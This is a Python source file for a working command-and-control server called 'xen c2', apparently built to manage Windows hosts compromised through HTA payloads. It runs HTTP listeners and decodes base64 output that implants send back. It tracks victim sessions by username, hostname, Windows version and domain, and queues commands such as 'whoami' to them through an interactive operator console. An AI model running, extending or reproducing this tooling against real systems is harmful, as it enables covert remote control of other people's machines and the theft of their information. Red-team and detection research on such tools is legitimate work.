from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import base64
import os
import readline
import socket
import threading
import datetime
import uuid
import sq3db_conn as db_conn
import interact
import random
import json

HISTORY_FILE = os.path.expanduser("~/.hta_c2_history")

listeners = {}
listeners_lock = threading.Lock()
sessions = {}
sessions_lock = threading.Lock()


class HTAHandler(BaseHTTPRequestHandler):
    _bulk = ""

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Cache-Control', 'post-check=0, pre-check=0')
        self.end_headers()

        query = urllib.parse.urlparse(self.path).query
        args = urllib.parse.parse_qs(query)

        if "arg" in args:
            arg = args['arg'][0]
            arg = arg.replace("_", "+")
            HTAHandler._bulk += arg
            if "*" in arg:
                HTAHandler._bulk = HTAHandler._bulk[:-1]
                pads = len(HTAHandler._bulk) % 4
                if pads != 0:
                    HTAHandler._bulk += "=" * (4 - pads)
                try:
                    data = base64.b64decode(HTAHandler._bulk)
                    output = data.decode("utf-8").strip()
                except Exception:
                    output = ""
                HTAHandler._bulk = ""

                # Process session callback
                cb_id = self.headers.get("X-CB-ID")
                if not cb_id:
                    cb_id = "{:06d}".format(random.randint(0, 999999))
                self.headers["X-CB-ID"] = cb_id

                with sessions_lock:
                    if cb_id not in sessions:
                        username = output.splitlines()[0] if output else "unknown"
                        session_uuid = str(uuid.uuid4())
                        hostname = "unknown"
                        windows_ver = "unknown"
                        domain = "unknown"
                        created_at = datetime.datetime.now(datetime.timezone.utc).isoformat()
                        db_conn.add_session(name=username)
                        sessions[cb_id] = {
                            "session_uuid": session_uuid,
                            "username": username,
                            "hostname": hostname,
                            "windows_ver": windows_ver,
                            "domain": domain,
                            "created_at": created_at,
                            "queue": ["whoami"]
                        }
                        print(f"[+] New session from {username} connected (ID: {cb_id})")
                    else:
                        sessions[cb_id]["queue"].append(output)

        server_cmds = getattr(self.server, "cmds", None)
        if server_cmds and len(server_cmds) > 0:
            out = server_cmds.pop(0)
            try:
                self.wfile.write(bytes(out, "utf-8"))
            except BrokenPipeError:
                pass

    def log_message(self, format, *args):
        return


def _serve_http(port, listener_id):
    server = HTTPServer(('', port), HTAHandler)
    server.cmds = []
    with listeners_lock:
        if listener_id in listeners:
            listeners[listener_id]["server"] = server
    try:
        server.serve_forever()
    except Exception:
        pass
    finally:
        try:
            server.server_close()
        except Exception:
            pass


def start_listener(lhost, lport):
    with listeners_lock:
        for info in listeners.values():
            if info["port"] == lport:
                print("\033[91m[!] Listener already running on port {}\033[0m".format(lport))
                return None
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            test_sock.bind((lhost, lport))
            test_sock.close()

            listener_id = db_conn.add_listener(lhost, lport)
            t = threading.Thread(target=_serve_http, args=(lport, listener_id), daemon=True)
            listeners[listener_id] = {
                "host": lhost,
                "port": lport,
                "created_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                "thread": t
            }
            t.start()
            print("\033[92m[+] Listener {} started on {}:{}\033[0m".format(listener_id, lhost, lport))
            return listener_id
        except OSError as e:
            if getattr(e, "errno", None) == 98:
                print("\033[91m[!] Port {} in use. Kill before restarting.\033[0m".format(lport))
            else:
                print("\033[91m[!] Failed to start listener on {}:{} — {}\033[0m".format(lhost, lport, e))
            return None


def kill_listener(lport):
    removed = False
    with listeners_lock:
        for listener_id, info in list(listeners.items()):
            if info["port"] == lport:
                try:
                    srv = info.get("server")
                    if srv:
                        try: srv.shutdown()
                        except: pass
                        try: srv.server_close()
                        except: pass
                    if info.get("thread") and info["thread"].is_alive():
                        info["thread"].join(timeout=1)
                    del listeners[listener_id]
                    db_conn.remove_listener(lport)
                    print("\033[92m[-] Listener on port {} stopped\033[0m".format(lport))
                    removed = True
                    break
                except Exception as e:
                    print("\033[91m[!] Failed to stop listener on port {} — {}\033[0m".format(lport, e))
                    return False
    if not removed:
        db_conn.remove_listener(lport)
        print("\033[94m[*] No active listener found, removed DB entry for port {}\033[0m".format(lport))
    return removed


def list_listeners():
    with listeners_lock:
        if not listeners:
            print("[*] No active listeners.")
            return
        headers = ["ID", "Host", "Port", "Created At"]
        rows = []
        for listener_id, info in listeners.items():
            rows.append([listener_id, info["host"], str(info["port"]), info["created_at"]])
        col_widths = [max(len(str(row[i])) for row in rows + [headers]) for i in range(4)]
        top = '┌' + '┬'.join('─'*(col_widths[i]+2) for i in range(4)) + '┐'
        sep = '├' + '┼'.join('─'*(col_widths[i]+2) for i in range(4)) + '┤'
        bottom = '└' + '┴'.join('─'*(col_widths[i]+2) for i in range(4)) + '┘'
        print(top)
        print('│ ' + ' │ '.join(headers[i].ljust(col_widths[i]) for i in range(4)) + ' │')
        print(sep)
        for row in rows:
            print('│ ' + ' │ '.join(str(row[i]).ljust(col_widths[i]) for i in range(4)) + ' │')
        print(bottom)


def list_sessions():
    with sessions_lock:
        if not sessions:
            print("[*] No active sessions.")
            return
        headers = ["ID", "Username", "Hostname", "Windows", "Domain", "Created At"]
        rows = []
        for cb_id, info in sessions.items():
            rows.append([cb_id, info["username"], info["hostname"], info["windows_ver"], info["domain"], info["created_at"]])
        col_widths = [max(len(str(row[i])) for row in rows + [headers]) for i in range(6)]
        top = '┌' + '┬'.join('─'*(col_widths[i]+2) for i in range(6)) + '┐'
        sep = '├' + '┼'.join('─'*(col_widths[i]+2) for i in range(6)) + '┤'
        bottom = '└' + '┴'.join('─'*(col_widths[i]+2) for i in range(6)) + '┘'
        print(top)
        print('│ ' + ' │ '.join(headers[i].ljust(col_widths[i]) for i in range(6)) + ' │')
        print(sep)
        for row in rows:
            print('│ ' + ' │ '.join(str(row[i]).ljust(col_widths[i]) for i in range(6)) + ' │')
        print(bottom)


def repl():
    db_conn.init_db()
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass
    banner = r'''
 ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░▌                    ▐░▌
▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌                    ▐░▌
▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌     ▐░▌           ▄▄▄▄▄▄▄▄▄█░▌
▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀█░▌     ▐░▌          ▐░░░░░░░░░░░▌
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀         ▀       ▀       ▀         ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
        '''
    print(banner)
    print("xen c2. type 'help'")

    help_text = """Commands:
    help                  show this help
    listener start <lhost> <lport>     start HTTP listener
    listener list                      list active listeners
    interact <session id>              interact with a session
    listener kill <lport>              stop listener
    exit                               stop server"""

    while True:
        try:
            line = input("hta_c2 >> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        readline.add_history(line)

        parts = line.split()
        cmd = parts[0].lower()

        if cmd == "help":
            print(help_text)
        elif cmd == "listener":
            if len(parts) < 2:
                print("listener start <lhost> <lport> | listener list | listener kill <lport>")
                continue
            action = parts[1].lower()
            if action == "start" and len(parts) == 4:
                lhost, lport = parts[2], int(parts[3])
                start_listener(lhost, lport)
            elif action == "list":
                list_listeners()
            elif action == "kill" and len(parts) == 3:
                kill_listener(int(parts[2]))
            else:
                print("Unknown listener action")
        elif cmd == "interact":
            if len(parts) == 1:
                print("interact list | interact <session_id>")
            elif parts[1].lower() == "list":
                list_sessions()
            else:
                cb_id = parts[1]
                if cb_id in sessions:
                    import interact as intr
                    lst = None
                    with listeners_lock:
                        lst = next(iter(listeners.values()), None)
                    if lst:
                        intr.interact(cb_id, lst)
                else:
                    print("session not found")
        elif cmd == "exit":
            break
        else:
            print("unknown command")

    readline.write_history_file(HISTORY_FILE)


if __name__ == '__main__':
    repl()
